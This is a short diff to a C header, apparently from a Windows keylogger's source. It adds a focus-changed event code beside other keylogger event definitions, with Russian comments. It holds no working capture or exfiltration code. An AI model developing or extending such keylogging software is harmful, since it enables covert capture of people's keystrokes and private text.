@@ -322,6 +322,7 @@ typedef void(WINAPI * TKeyLoggerEventHandler)(PKeyLogger Logger, DWORD EventID,
 #define KLE_ADD_TEXT_LOG        5 /* Добавляется текстовый лог. Data = PCHAR */
 #define KLE_SHOW_WND            6 /* Событие вызывается перед вызовом функции отображения окна. Data = PShowWindowData */
 #define KLE_AFTER_SHOW_WND      7 /* Событие вызывается после вызова функции отображения окна  Data = PShowWindowData */
+#define KLE_FOCUS_CHANGED       8 /* Изменилось окно вокуса; Data = *HWND */
 
 // ****************************************************************************
 // KeyLogger - методы для организации работы кейлогера и работы с ним
